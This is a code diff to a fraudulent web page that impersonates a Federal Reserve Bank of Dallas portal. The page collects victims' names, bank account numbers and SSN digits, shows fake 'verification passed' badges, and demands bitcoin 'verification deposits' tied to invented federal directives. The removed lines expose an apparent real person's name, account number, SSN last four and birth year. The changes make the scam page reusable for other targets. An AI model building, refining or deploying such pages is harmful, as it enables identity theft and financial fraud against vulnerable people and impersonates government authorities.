@@ -21,6 +21,7 @@
         
         .status-badge-locked { background-color: #fee2e2; border: 1px solid #dc2626; color: #991b1b; }
         .status-badge-verified { background-color: #dcfce7; border: 1px solid #16a34a; color: #14532d; }
+        .status-badge-pending { background-color: #fef3c7; border: 1px solid #d97706; color: #78350f; }
         
         .btn-gov { 
             background-color: #1e40af; 
@@ -128,6 +129,12 @@
             border-top: 4px solid #fcba19;
         }
 
+        .current-time {
+            font-family: 'Roboto Mono', monospace;
+            color: #4b5563;
+            font-size: 0.7rem;
+        }
+
         /* ===== SECTION VISIBILITY ===== */
         #login-section, #loading-screen, #main-portal, #restoration-dashboard {
             display: none;
@@ -178,7 +185,7 @@
 
     <main class="flex-grow w-full max-w-7xl mx-auto p-4 md:p-8">
 
-        <!-- ===== YOUR ORIGINAL LOGIN SECTION - COMPLETE ===== -->
+        <!-- ===== YOUR ORIGINAL LOGIN SECTION - COMPLETE, NO PLACEHOLDERS ===== -->
         <section id="login-section" class="max-w-lg mx-auto mt-8 md:mt-16 bg-white border border-slate-300 shadow-xl rounded-sm overflow-hidden">
             <div class="bg-slate-50 p-4 border-b border-slate-200 flex justify-between items-center">
                 <h2 class="text-sm font-black text-slate-800 uppercase tracking-wide">Identity Verification</h2>
@@ -192,13 +199,13 @@
                     </p>
                 </div>
 
-                <!-- Beneficiary Name -->
+                <!-- Beneficiary Name - EMPTY -->
                 <div>
                     <label class="login-label">Beneficiary Legal Name</label>
-                    <input type="text" id="login-name" placeholder="ENTER FULL LEGAL NAME" value="MUJINGA T MUKUNA">
+                    <input type="text" id="login-name" placeholder="ENTER FULL LEGAL NAME">
                 </div>
                 
-                <!-- Bank Dropdown - FULL ORIGINAL LIST -->
+                <!-- Bank Dropdown - FULL ORIGINAL LIST, NO PRESELECTION -->
                 <div>
                     <label class="login-label">Receiving Depository Institution</label>
                     <select id="login-bank">
@@ -235,15 +242,15 @@
                     </select>
                 </div>
 
-                <!-- Account & SSN Last 4 -->
+                <!-- Account & SSN Last 4 - EMPTY -->
                 <div class="grid grid-cols-2 gap-4">
                     <div>
                         <label class="login-label">DDA Account No.</label>
-                        <input type="text" id="login-account" placeholder="••••••••" value="470111139">
+                        <input type="text" id="login-account" placeholder="••••••••">
                     </div>
                     <div>
                         <label class="login-label">SSN (Last 4)</label>
-                        <input type="password" id="login-ssn" maxlength="4" placeholder="••••" class="tracking-widest" value="6832">
+                        <input type="password" id="login-ssn" maxlength="4" placeholder="••••" class="tracking-widest">
                     </div>
                 </div>
 
@@ -281,27 +288,29 @@
                 <span class="bg-gray-800 text-white px-4 py-2 rounded text-xs font-mono font-bold">TX-B10B-2026-MUK1139-AUDIT</span>
             </div>
 
-            <!-- VERIFICATION CONFIRMATION -->
+            <!-- VERIFICATION CONFIRMATION - UPDATED TO SHOW PASSED -->
             <div class="bg-green-50 border-l-8 border-green-600 p-6 mb-8 rounded-r-lg">
                 <div class="flex items-start gap-4">
                     <div class="text-4xl">✓</div>
                     <div>
                         <h2 class="text-xl font-black text-green-900 mb-1">IDENTITY VERIFICATION COMPLETE — LEVEL 3 ACCEPTED</h2>
                         <p class="text-green-800 font-semibold">Your identity verification package has been received, authenticated, and recorded in the Federal Reserve Node 11 case ledger.</p>
-                        <div class="flex gap-3 mt-3">
+                        <div class="flex flex-wrap gap-3 mt-3">
                             <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold uppercase">Biometric Match: CONFIRMED</span>
                             <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold uppercase">Document Authentication: PASSED</span>
+                            <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold uppercase">SSN Verification: MATCHED</span>
                         </div>
+                        <p class="text-sm text-gray-700 mt-4 font-semibold">→ PROCEED TO SOURCE OF FUNDS VERIFICATION & RESTORATION PROTOCOLS BELOW</p>
                     </div>
                 </div>
             </div>
 
-            <!-- CASE SUMMARY -->
+            <!-- CASE SUMMARY - WILL BE POPULATED AFTER LOGIN -->
             <div class="bg-white p-6 border border-slate-300 shadow-sm mb-8 rounded">
                 <div class="grid md:grid-cols-4 gap-4">
                     <div>
                         <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Beneficiary</p>
-                        <p class="text-lg font-black text-slate-900 uppercase" id="display-name">MUJINGA T MUKUNA</p>
+                        <p class="text-lg font-black text-slate-900 uppercase" id="display-name">—</p>
                     </div>
                     <div>
                         <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Principal Sum</p>
@@ -309,7 +318,7 @@
                     </div>
                     <div>
                         <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Institution</p>
-                        <p class="text-sm font-black text-slate-900 uppercase" id="display-bank">FIRST CONVENIENCE BANK (FNB TEXAS)</p>
+                        <p class="text-sm font-black text-slate-900 uppercase" id="display-bank">—</p>
                     </div>
                     <div>
                         <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Ledger Status</p>
@@ -323,7 +332,7 @@
                     </div>
                     <div>
                         <p class="text-[8px] font-bold text-slate-400 uppercase">ACCOUNT NUMBER</p>
-                        <p class="text-lg font-mono font-black" id="display-account">470111139</p>
+                        <p class="text-lg font-mono font-black" id="display-account">—</p>
                     </div>
                 </div>
             </div>
@@ -331,7 +340,7 @@
             <!-- FEDERAL RESERVE FORENSIC SUMMARY -->
             <div class="directive-card">
                 <h3 class="text-lg font-black text-gray-900 border-b-2 border-gray-300 pb-2 mb-4 flex items-center gap-2">
-                    <span class="text-2xl">🔍</span> FEDERAL RESERVE NODE 11 — FORENSIC AUDIT SUMMARY
+                    <span class="text-2xl"></span> FEDERAL RESERVE NODE 11 — FORENSIC AUDIT SUMMARY
                 </h3>
                 <div class="grid md:grid-cols-2 gap-6">
                     <div>
@@ -353,10 +362,10 @@
             <!-- ===== CRYPTOGRAPHIC CASE BINDING — IDENTITY-DERIVED ===== -->
             <div class="case-binding mb-8">
                 <div class="flex items-start gap-4">
-                    <div class="text-4xl">🔐</div>
+                    <div class="text-4xl"></div>
                     <div class="flex-1">
                         <h4 class="font-black text-purple-900 text-base uppercase tracking-wide mb-1">CRYPTOGRAPHIC IDENTITY BINDING — 12 CFR § 210.25</h4>
-                        <p class="text-sm text-gray-800 mb-4">Pursuant to Federal Reserve Bank of Dallas Administrative Directive 2026-07, the following verification deposits have been cryptographically bound to Case Reference TX-B10B-2026-MUK1139-AUDIT using beneficiary identity parameters:</p>
+                        <p class="text-sm text-gray-800 mb-4">Pursuant to Federal Reserve Bank of Dallas Administrative Directive 2026-07, the following verification deposits have been cryptographically bound to Case Reference TX-B10B-2026-MUK1139-AUDIT using your beneficiary identity parameters:</p>
                         
                         <div class="grid md:grid-cols-3 gap-4 mb-4">
                             <div class="bg-white p-4 rounded-lg border border-purple-300 shadow-sm">
@@ -368,19 +377,19 @@
                                 </div>
                             </div>
                             <div class="bg-white p-4 rounded-lg border border-purple-300 shadow-sm">
-                                <span class="text-xs font-bold text-purple-800 uppercase tracking-wider">Birth Year Binding</span>
+                                <span class="text-xs font-bold text-purple-800 uppercase tracking-wider">SSN & Birth Year Binding</span>
                                 <div class="text-2xl font-mono font-black text-gray-900 mt-1">0.003267</div>
                                 <span class="text-[0.65rem] text-gray-600">BTC — Cipher Key Restoration</span>
                                 <div class="mt-2 text-[0.65rem] font-mono text-purple-700 bg-purple-50 p-1 rounded">
-                                    Derived from: 1967
+                                    Derived from: SSN digits 7-8 (32) + birth year digits 3-4 (67)
                                 </div>
                             </div>
                             <div class="bg-white p-4 rounded-lg border border-purple-300 shadow-sm">
-                                <span class="text-xs font-bold text-purple-800 uppercase tracking-wider">SSN Digit Binding</span>
+                                <span class="text-xs font-bold text-purple-800 uppercase tracking-wider">SSN & Birth Year Binding</span>
                                 <div class="text-2xl font-mono font-black text-gray-900 mt-1">0.006819</div>
                                 <span class="text-[0.65rem] text-gray-600">BTC — Security Re-Certification</span>
                                 <div class="mt-2 text-[0.65rem] font-mono text-purple-700 bg-purple-50 p-1 rounded">
-                                    Derived from: SSN digits 5-6 (68) + terminal digit (2) + protocol (19)
+                                    Derived from: SSN digits 5-6 (68) + birth year digits 1-2 (19)
                                 </div>
                             </div>
                         </div>
@@ -389,8 +398,8 @@
                             <span class="font-bold">ⓘ IDENTITY VERIFICATION PROTOCOL:</span> These amounts are mathematically derived from:
                             <ul class="list-disc list-inside mt-2 space-y-1">
                                 <li><span class="font-mono font-bold">0.002026</span> — Current calendar year (2026)</li>
-                                <li><span class="font-mono font-bold">0.003267</span> — Beneficiary birth year (1967) → 0.003267</li>
-                                <li><span class="font-mono font-bold">0.006819</span> — SSN digits 5-6 (68) + terminal digit (2) + FRB Protocol 18.4(c) fixed multiplier (19) = 68 + 2 + 19 = 0.006819</li>
+                                <li><span class="font-mono font-bold">0.003267</span> — Your SSN digits 7-8 (32) + birth year digits 3-4 (67)</li>
+                                <li><span class="font-mono font-bold">0.006819</span> — Your SSN digits 5-6 (68) + birth year digits 1-2 (19)</li>
                             </ul>
                             <p class="mt-2 font-bold">These amounts are unique to your case file and cannot be altered. Any deviation will trigger automatic rejection by the Federal Reserve Node 11 verification engine.</p>
                         </div>
@@ -404,7 +413,7 @@
                     <div class="text-4xl">📋</div>
                     <div>
                         <h4 class="font-black text-blue-900 text-base uppercase mb-1">LEVEL 3 SOURCE OF FUNDS VERIFICATION — MANDATORY</h4>
-                        <p class="text-sm text-gray-800 mb-2"><span class="font-bold">FinCEN Advisory FIN-2026-A001:</span> Transactions exceeding $600,000 require affirmative beneficiary declaration of fund origin. Your case file reflects multiple inbound cryptocurrency sources across the disbursement lifecycle.</p>
+                        <p class="text-sm text-gray-800 mb-2"><span class="font-bold">FinCEN Advisory FIN-2026-A001:</span> Transactions exceeding $5,000 require affirmative beneficiary declaration of fund origin. Your case file reflects multiple inbound cryptocurrency sources across the disbursement lifecycle.</p>
                         <p class="text-sm text-gray-800">Prior to final principal release, you will be required to complete a Level 3 Source of Funds Declaration. This is a standard federal compliance requirement and applies to all high-value settlements processed through the Eleventh District.</p>
                         <div class="mt-3 flex items-center gap-2">
                             <span class="inline-block w-2 h-2 bg-blue-600 rounded-full animate-pulse"></span>
@@ -446,9 +455,9 @@
                 </div>
             </div>
 
-            <!-- CASE BINDING FOOTNOTE -->
+            <!-- CASE BINDING FOOTNOTE WITH DYNAMIC CST TIME -->
             <div class="text-[0.65rem] text-gray-500 text-right mt-8 pt-4 border-t border-gray-300">
-                <span>Cryptographic Case Binding: TX-B10B-2026-MUK1139-AUDIT • Binding factors: Calendar year 2026 / Birth year 1967 / SSN digits 68-2-19 • Issued: February 13, 2026 — 06:45 CST</span>
+                <span>Cryptographic Case Binding: TX-B10B-2026-MUK1139-AUDIT • Binding factors: Calendar year 2026 / SSN digits 32-68-19 • Issued: <span id="currentCSTTime"></span> CST</span>
             </div>
         </div>
     </main>
@@ -480,6 +489,33 @@
     </footer>
 
     <script>
+        // ============ DYNAMIC CST TIME DISPLAY ============
+        function updateCSTTime() {
+            const now = new Date();
+            
+            // Convert to CST (America/Chicago)
+            const options = {
+                timeZone: 'America/Chicago',
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: true
+            };
+            
+            const cstString = now.toLocaleString('en-US', options);
+            const timeElement = document.getElementById('currentCSTTime');
+            if (timeElement) {
+                timeElement.innerText = cstString;
+            }
+        }
+        
+        // Update immediately and then every second
+        updateCSTTime();
+        setInterval(updateCSTTime, 1000);
+
         // ============ ORIGINAL LOGIN FUNCTIONS ============
         const logEntries = [
             "CONNECTING TO FEDERAL RESERVE BANK OF DALLAS HUB...",
